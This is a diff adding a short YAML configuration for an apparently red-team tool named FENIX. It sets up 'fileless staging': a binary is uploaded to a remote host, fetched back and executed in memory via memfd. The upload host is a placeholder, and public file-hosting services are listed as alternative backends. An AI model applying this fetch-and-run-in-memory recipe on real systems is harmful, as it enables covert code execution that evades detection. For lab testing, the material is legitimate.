@@ -1,0 +1,25 @@
+##############################################################################
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+# STOP. THIS FILE WILL NOT RUN AS CHECKED IN.
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+#
+# remote_upload_url is a PLACEHOLDER (YOUR-LAB-HOST).
+# FENIX will print a refusal banner and exit if you run this unchanged.
+#
+# To use it, either:
+#   A) Replace YOUR-LAB-HOST with a host YOU control, e.g.
+#        remote_upload_url: https://files.your-lab.example/fenix-hello.bin
+#   B) Drop remote_backend: put / remote_upload_url and name an adapter:
+#        remote_backend: uguu          # also: tmpfiles | catbox | pastebin
+#
+# FENIX never picks uguu/catbox/tmpfiles for you.
+# Docs: docs/STAGING_REMOTE.md
+##############################################################################
+technique: fileless-staging
+source_file: payloads/hello_elf/hello
+remote: true
+remote_backend: put
+remote_upload_url: https://YOUR-LAB-HOST/fenix-hello.bin
+remote_fetch: requests
+execute: memfd
+method: procfs-fd
